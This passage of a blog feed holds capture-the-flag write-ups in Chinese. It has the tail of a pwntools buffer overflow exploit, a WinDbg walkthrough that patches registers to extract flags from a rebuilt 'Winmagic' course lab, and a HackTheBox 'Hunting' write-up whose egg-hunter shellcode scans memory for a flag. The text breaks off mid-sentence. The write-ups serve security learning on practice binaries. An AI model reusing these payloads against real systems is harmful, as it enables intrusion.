class="string">b&quot;\n&quot;</span>), <span class="number">16</span>)</span><br><span class="line">l33t = main - <span class="number">0x36</span> + <span class="number">0x4</span></span><br><span class="line">p = <span class="string">b&quot;a&quot;</span> * <span class="number">56</span> + p64(l33t)</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">b&quot;: &quot;</span>, p)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></div><p>執行結果：<br>BTW 這個 flag 是我亂生的，講師在影片裡沒有 leak flag。<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/bofeasy_pwn.png"                      alt="pwn"                ></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Intro&quot;&gt;&lt;a href=&quot;#Intro&quot; class=&quot;headerlink&quot; title=&quot;Intro&quot;&gt;&lt;/a&gt;Intro&lt;/h2&gt;&lt;p&gt;這題是要練習 windows 的 bof，結果意外的因為沒有提供 lab 又練習到 AppJailLauncher.</summary>
      
    
    
    
    
    <category term="pwn" scheme="https://kazma.tw/tags/pwn/"/>
    
    <category term="windows" scheme="https://kazma.tw/tags/windows/"/>
    
    <category term="bof" scheme="https://kazma.tw/tags/bof/"/>
    
  </entry>
  
  <entry>
    <title>AngelBoy Windows Binary Exploitation Winmagic Writeup</title>
    <link href="https://kazma.tw/2024/11/18/AngelBoy-Windows-Binary-Exploitation-Winmagic-Writeup/"/>
    <id>https://kazma.tw/2024/11/18/AngelBoy-Windows-Binary-Exploitation-Winmagic-Writeup/</id>
    <published>2024-11-18T04:55:50.823Z</published>
    <updated>2024-11-19T13:11:00.311Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h2><p>Hi, 我是 Kazma~<br>這堂課是臺灣好厲駭 AngelBoy 的 Windows Binary Exploitation 系列課程，由於今年只有錄影檔而且沒有 lab 可以使用，所以自己試著把講師上課的 lab 還原並整理解題筆記在這邊，感謝 AngelBoy 的課程！<br>喔對了因為錄影檔很小聲所以我有把影片上傳到下面這個網站，然後把音量調超大，推薦大家可以用看看：<br><a class="link"   href="https://online-video-cutter.com/tw/volume" >https://online-video-cutter.com/tw/volume <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><h2 id="Lab-Recover"><a href="#Lab-Recover" class="headerlink" title="Lab Recover"></a>Lab Recover</h2><p>source code:</p><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//g++ -g -o Winmagic.exe .\Winmagic.cpp -fpermissive</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;io.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdint&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">get_flag2</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> key[] = <span class="string">&quot;Do_you_know_why_my_teammate_Orange_is_so_angry?&quot;</span>;</span><br><span class="line">    <span class="type">char</span> cipher[] = &#123;</span><br><span class="line">        <span class="string">&#x27;\x02&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;\x1e&#x27;</span>, <span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;\x14&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;\x05&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;\x10&#x27;</span>, <span class="string">&#x27;\x00&#x27;</span>, <span class="string">&#x27;\x1e&#x27;</span>, <span class="string">&#x27;\x1b&#x27;</span>, <span class="string">&#x27;&amp;&#x27;</span>, <span class="string">&#x27;k&#x27;</span>, <span class="string">&#x27;\x01&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;+&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;\x13&#x27;</span>, <span class="string">&#x27;\x04&#x27;</span>, <span class="string">&#x27;\x1f&#x27;</span>, <span class="string">&#x27;\x14&#x27;</span>, <span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;\x1c&#x27;</span>, <span class="string">&#x27;\x00&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;4&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;\x14&#x27;</span>, <span class="string">&#x27;\x02&#x27;</span>, <span class="string">&#x27;8&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;\x1b&#x27;</span>, <span class="string">&#x27;,&#x27;</span>, <span class="string">&#x27;-&#x27;</span>, <span class="string">&#x27;@&#x27;</span>, <span class="string">&#x27;\x19&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;\x13&#x27;</span>, <span class="string">&#x27;\x1d&#x27;</span>, <span class="string">&#x27;\x0e&#x27;</span>, <span class="string">&#x27;\x1c&#x27;</span>, <span class="string">&#x27;\x1e&#x27;</span>, <span class="string">&#x27;B&#x27;</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; <span class="built_in">sizeof</span>(cipher); i++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, cipher[i] ^ key[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">getchar</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">get_flag3</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> key[] = <span class="string">&quot;Do_you_know_why_my_teammate_jeffxx_is_so_angry??????????&quot;</span>;</span><br><span class="line">    <span class="type">char</span> cipher[] = &#123;</span><br><span class="line">        <span class="string">&#x27;\x02&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;\x1e&#x27;</span>, <span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;\x14&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;\x05&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;\x06&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;\x03&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;\x18&#x27;</span>, <span class="string">&#x27;\x06&#x27;</span>, <span class="string">&#x27;&amp;&#x27;</span>, <span class="string">&#x27;=&#x27;</span>, <span class="string">&#x27;\x1f&#x27;</span>, <span class="string">&#x27;\x1c&#x27;</span>, <span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;\x1f&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;\x15&#x27;</span>, <span class="string">&#x27;Q&#x27;</span>, <span class="string">&#x27;\x04&#x27;</span>, <span class="string">&#x27;\x03&#x27;</span>, <span class="string">&#x27;\x15&#x27;</span>, <span class="string">&#x27;\x07&#x27;</span>, <span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;k&#x27;</span>, <span class="string">&#x27;\x18&#x27;</span>, <span class="string">&#x27;V&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;9&#x27;</span>, <span class="string">&#x27;\x05&#x27;</span>, <span class="string">&#x27;\x17&#x27;</span>, <span class="string">&#x27;\x16&#x27;</span>, <span class="string">&#x27;)&#x27;</span>, <span class="string">&#x27;\x0c&#x27;</span>, <span class="string">&#x27;\x1d&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;\x16&#x27;</span>, <span class="string">&#x27;\x01&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;+&#x27;</span>, <span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;\x07&#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;-&#x27;</span>, <span class="string">&#x27;\x0b&#x27;</span>, <span class="string">&#x27;Z&#x27;</span>, <span class="string">&#x27;^&#x27;</span>, <span class="string">&#x27;S&#x27;</span>, <span class="string">&#x27;`&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;H&#x27;</span>, <span class="string">&#x27;\x0f&#x27;</span>, <span class="string">&#x27;M&#x27;</span>, <span class="string">&#x27;S&#x27;</span>, <span class="string">&#x27;[&#x27;</span>, <span class="string">&#x27;B&#x27;</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; <span class="built_in">sizeof</span>(cipher); i++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, cipher[i] ^ key[i] ^ (<span class="built_in">rand</span>() % <span class="number">256</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">getchar</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">get_flag</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> password;</span><br><span class="line">    <span class="type">int</span> magic;</span><br><span class="line">    <span class="built_in">srand</span>((<span class="type">unsigned</span> <span class="type">int</span>)<span class="built_in">time</span>(<span class="literal">NULL</span>));</span><br><span class="line"></span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> key[] = <span class="string">&quot;Do_you_know_why_my_teammate_ddaa_is_so_angry??????&quot;</span>;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> cipher[] = &#123;</span><br><span class="line">        <span class="string">&#x27;\x02&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;\x1e&#x27;</span>, <span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;\x14&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;\x05&#x27;</span>, <span class="string">&#x27;*&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;\x10&#x27;</span>, <span class="string">&#x27;\x00&#x27;</span>, <span class="string">&#x27;\x1e&#x27;</span>, <span class="string">&#x27;\x1b&#x27;</span>, <span class="string">&#x27;&amp;&#x27;</span>, <span class="string">&#x27;)&#x27;</span>, <span class="string">&#x27;\x08&#x27;</span>, <span class="string">&#x27;\x0b&#x27;</span>, <span class="string">&#x27;&amp;&#x27;</span>, <span class="string">&#x27;+&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;\x0c&#x27;</span>, <span class="string">&#x27;\x0c&#x27;</span>, <span class="string">&#x27;\x1d&#x27;</span>, <span class="string">&#x27;\x02&#x27;</span>, <span class="string">&#x27;\x13&#x27;</span>, <span class="string">&#x27;\x00&#x27;</span>, <span class="string">&#x27;\x04&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;\x10&#x27;</span>, <span class="string">&#x27;;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;P&#x27;</span>, <span class="string">&#x27;\x0f&#x27;</span>, <span class="string">&#x27;\x00&#x27;</span>, <span class="string">&#x27;\x1e&#x27;</span>, <span class="string">&#x27;\x1a&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;\x17&#x27;</span>, <span class="string">&#x27;\x00&#x27;</span>, <span class="string">&#x27;(&#x27;</span>, <span class="string">&#x27;\x12&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;\x14&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;\x1a&#x27;</span>, <span class="string">&#x27;J&#x27;</span>, <span class="string">&#x27;M&#x27;</span>, <span class="string">&#x27;V&#x27;</span>, <span class="string">&#x27;K&#x27;</span>, <span class="string">&#x27;F&#x27;</span>, <span class="string">&#x27;B&#x27;</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    password = <span class="built_in">rand</span>();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Give me magic: &quot;</span>);</span><br><span class="line">    <span class="built_in">scanf_s</span>(<span class="string">&quot;%d&quot;</span>, &amp;magic);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (password == magic) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Success!!!\n&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; <span class="built_in">sizeof</span>(cipher); i++) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, cipher[i] ^ key[i]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Failed. QQ\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">getchar</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">setvbuf</span>(stdout, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">setvbuf</span>(stdin, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">get_flag</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((std::<span class="type">uintptr_t</span>)&amp;main == <span class="number">0xddaa</span>) &#123;</span><br><span class="line">        <span class="built_in">get_flag2</span>();</span><br><span class="line">        <span class="built_in">get_flag3</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>用 <code>g++ -g -o Winmagic.exe .\Winmagic.cpp -fpermissive</code> 來編譯上面的程式碼。</p><h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h2><h3 id="get-flag1"><a href="#get-flag1" class="headerlink" title="get_flag1"></a>get_flag1</h3><p>首先是 <code>get_flag()</code> 會去比對輸入和一個隨機的值，我們可以透過在比較前下斷點使用 windbg 將輸入改成正確的隨機值就能拿到 flag。<br>我們先把程式跑起來之後用 windbg attach 上去，然後透過 <code>bp get_flag</code> 來下斷點之後用 <code>g</code> 繼續執行，透過左上角的 break 來繼續分析，我們可以透過 <code>uf get_flag</code> 來反組譯這個函式，可以看到以下的片段：</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">56 00007ff7`438e178b 488d45f0        lea     rax,[rbp-10h]</span><br><span class="line">56 00007ff7`438e178f 4889c2          mov     rdx,rax</span><br><span class="line">56 00007ff7`438e1792 488d057a880000  lea     rax,[Winmagic+0xa013 (00007ff7`438ea013)]</span><br><span class="line">56 00007ff7`438e1799 4889c1          mov     rcx,rax</span><br><span class="line">56 00007ff7`438e179c e8ef6a0000      call    Winmagic!scanf_s (00007ff7`438e8290)</span><br><span class="line">58 00007ff7`438e17a1 8b45f0          mov     eax,dword ptr [rbp-10h]</span><br><span class="line">58 00007ff7`438e17a4 3945f4          cmp     dword ptr [rbp-0Ch],eax</span><br><span class="line">58 00007ff7`438e17a7 755c            jne     Winmagic!get_flag+0x168 (00007ff7`438e1805)</span><br></pre></td></tr></table></figure></div><p>其中 scanf 是我們的輸入，而 cmp 的部分就是在比較我們的輸入和隨機值，所以我們可以透過 <code>bp 00007ff7`438e17a4</code> 在比較前下斷點，然後我們繼續之後隨便輸入一個數字之後按 Enter 可以看到 windbg 停在比較的斷點上，然後我們可以透過 <code>r eax = poi(隨機值的地址)</code> 將我們的輸入設定成隨機值：<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/winmagic_poi.png"                      alt="poi"                ><br>接著 <code>g</code> 之後就可以看到程式輸出 flag：<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/winmagic_flag1.png"                      alt="pwn"                ></p><h3 id="get-flag2"><a href="#get-flag2" class="headerlink" title="get_flag2"></a>get_flag2</h3><p>這個簡單許多，因為程式本身是不可能執行到 get_flag2 的，所以我們可以直接在 attach 上去之後先 <code>bp main</code> 然後執行 <code>g</code> 讓程式停在 main，接著我們直接透過 <code>r rip = get_flag2</code> 把 rip 設成 get_flag2 的位置，接著 <code>g</code> 就可以看到 flag 了。<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/winmagic_flag2.png"                      alt="flag2"                ></p><h3 id="get-flag3"><a href="#get-flag3" class="headerlink" title="get_flag3"></a>get_flag3</h3><p>這次的情況不僅不會執行到，甚至輸出前還會 xor rand()，讓我們會看到輸出是一串亂碼，所以我們可以在每次 xor rand() 時把存著 rand 的暫存器設成 0，但是一個位元做一次太麻煩所以我們可以用 Condition Breakpoint 來幫我們完成這些繁瑣的操作，參考指令如下：<br><code>bp 00007ff6`4b481656 &quot;.if @eax !=0 &#123;r eax = 0; g&#125;.else&#123;g&#125;&quot;</code><br>執行結果：<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/winmagic_flag3.png"                      alt="flag3"                ></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Intro&quot;&gt;&lt;a href=&quot;#Intro&quot; class=&quot;headerlink&quot; title=&quot;Intro&quot;&gt;&lt;/a&gt;Intro&lt;/h2&gt;&lt;p&gt;Hi, 我是 Kazma~&lt;br&gt;這堂課是臺灣好厲駭 AngelBoy 的 Windows Binary Explo</summary>
      
    
    
    
    
    <category term="pwn" scheme="https://kazma.tw/tags/pwn/"/>
    
    <category term="windows" scheme="https://kazma.tw/tags/windows/"/>
    
    <category term="windbg" scheme="https://kazma.tw/tags/windbg/"/>
    
  </entry>
  
  <entry>
    <title>HackTheBox-Machines Hunting Writeup</title>
    <link href="https://kazma.tw/2024/11/17/HackTheBox-Machines-Hunting-Writeup/"/>
    <id>https://kazma.tw/2024/11/17/HackTheBox-Machines-Hunting-Writeup/</id>
    <published>2024-11-17T09:54:48.089Z</published>
    <updated>2024-11-17T11:44:48.723Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Background-Knowledge"><a href="#Background-Knowledge" class="headerlink" title="Background Knowledge"></a>Background Knowledge</h2><p>這題要考的技巧叫做 “Egg Hunting”，使一種在記憶體中搜尋並找到特定資料的技術，主要是應用於漏洞利用場景，尤其是在無法確定目標（“egg”）具體位置的情況下。</p><ul><li>Egg 通常是一段特定的 shellcode 或是資料，是攻擊者希望執行或是利用的目標，可能放在 Heap、Data Section 或其他地方。</li><li>Egg Hunter 是一段很輕量的程式碼，會遍歷記憶體區域找尋特定標記，標記通常是一段字串，找到標記後就會跳轉到該位置執行。</li></ul><h2 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h2><p><code>file</code> 可以看到檔案是 32-bit x86 ELF，然後沒有 Canary 跟 PIE。<br>程式主邏輯如下：</p><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [esp-Ch] [ebp-20h]</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [esp-8h] [ebp-1Ch]</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [esp+0h] [ebp-14h]</span></span><br><span class="line">  <span class="type">void</span> (__cdecl *v7)(<span class="type">int</span> *); <span class="comment">// [esp+0h] [ebp-14h]</span></span><br><span class="line">  <span class="type">int</span> dest; <span class="comment">// [esp+4h] [ebp-10h]</span></span><br><span class="line">  <span class="type">int</span> RandomAddr; <span class="comment">// [esp+8h] [ebp-Ch]</span></span><br><span class="line">  <span class="type">void</span> *retaddr; <span class="comment">// [esp+18h] [ebp+4h]</span></span><br><span class="line"></span><br><span class="line">  RandomAddr = getRandomAddr();</span><br><span class="line">  signal(<span class="number">14</span>, &amp;<span class="built_in">exit</span>, v4, v5);</span><br><span class="line">  alarm(<span class="number">10</span>);</span><br><span class="line">  dest = mmap(RandomAddr, <span class="number">0x1000</span>, <span class="number">3</span>, <span class="number">49</span>, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( dest == <span class="number">-1</span> )</span><br><span class="line">    sub_1120(<span class="number">-1</span>, v6, <span class="number">-1</span>, RandomAddr);</span><br><span class="line">  <span class="built_in">strcpy</span>(dest, flag);</span><br><span class="line">  <span class="built_in">memset</span>(flag, <span class="number">0</span>, <span class="keyword">sizeof</span>(flag));</span><br><span class="line">  build_sandbox();</span><br><span class="line">  v7 = (<span class="type">void</span> (__cdecl *)(<span class="type">int</span> *))mmap(<span class="number">0</span>, <span class="number">4096</span>, <span class="number">7</span>, <span class="number">33</span>, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">  read(<span class="number">0</span>);</span><br><span class="line">  retaddr = <span class="number">0</span>;</span><br><span class="line">  v7(&amp;argc);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>以及 <code>getRandomAddr()</code>：</p><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">getRandomAddr</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [esp+0h] [ebp-18h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [esp+8h] [ebp-10h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v2 = open(<span class="string">&quot;/dev/urandom&quot;</span>, <span class="number">0</span>);</span><br><span class="line">  read(v2);</span><br><span class="line">  close(v2, &amp;v1, <span class="number">8</span>);</span><br><span class="line">  srand(v1);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">0x5FFFFFFF</span>; i = rand() &lt;&lt; <span class="number">16</span> )</span><br><span class="line">    ;</span><br><span class="line">  <span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>可以看到程式先拿一個隨機地址，然後會把拿到的隨機地址當成其中一個參數做 mmap，我們可以對應一下各個參數的意義：</p><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span>* <span class="title function_">mmap</span><span class="params">(<span class="type">void</span>* addr, <span class="type">size_t</span> length, <span class="type">int</span> prot, <span class="type">int</span> flags, <span class="type">int</span> fd, <span class="type">off_t</span> offset)</span>;</span><br><span class="line">dest = mmap(RandomAddr, <span class="number">0x1000</span>, <span class="number">3</span>, <span class="number">0x31</span>, <span class="number">-1</span>, <span class="number">0</span>);</span><br></pre></td></tr></table></figure></div><ul><li>RandomAddr: 映射的起始地址</li><li>0x1000: 映射區域大小，約 4KB</li><li>3 (PROT_READ | PROT_WRITE): PROT_READ (1): 可讀 + PROT_WRITE (2): 可寫。</li><li>49 (MAP_PRIVATE | MAP_FIXED | MAP_ANONYMOUS): MAP_PRIVATE (0x02): 私有映射，對映射區域的更改不會反映到檔案中 + MAP_FIXED (0x10): 強制映射到 RandomAddr。如果該地址無法使用，會導致映射失敗 + MAP_ANONYMOUS (0x20): 匿名映射，無需關聯檔案</li><li>-1: 表示匿名映射，因為不需要關聯任何檔案。</li><li>0: 偏移量為 0，對於匿名映射無意義。</li></ul><p>然後如果映射成功就把 flag 複製過去，並且把原本的 flag 清空，接著他限制程式可以執行的系統呼叫來建置沙盒，然後 mmap 一段記憶體讓我們可以執行 shellcode。</p><h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h2><p>首先是我們的 egg hunter:</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">setup:</span><br><span class="line">    mov eax, 27</span><br><span class="line">    int 0x80</span><br><span class="line">    mov edi, 0x7b425448</span><br><span class="line">    mov edx, 0x5fffffff</span><br><span class="line"></span><br><span class="line">next_page:</span><br><span class="line">    or dx, 0xfff</span><br><span class="line"></span><br><span class="line">test_next:</span><br><span class="line">    inc edx</span><br><span class="line">    pusha</span><br><span class="line">    xor ecx, ecx</span><br><span class="line">    mov al, 0x21</span><br><span class="line">    lea ebx, [edx + 0x4]</span><br><span class="line">    int 0x80</span><br><span class="line"></span><br><span class="line">    cmp al, 0xf2</span><br><span class="line">    popa</span><br><span class="line">    jz next_page</span><br><span class="line"></span><br><span class="line">    push 0x04</span><br><span class="line">    pop eax</span><br><span class="line">    push 0x01</span><br><span class="line">    pop ebx</span><br><span class="line">    mov ecx, edx</span><br><span class="line">    push 0x24</span><br><span class="line">    pop edx</span><br><span class="line">    int 0x80</span><br><span class="line"></span><br></pre></td></tr></table></figure></div><p>因為隨機地址的範圍是 [0, 0x5FFFFFFF]，所以一開始 setup 的時候我們先將 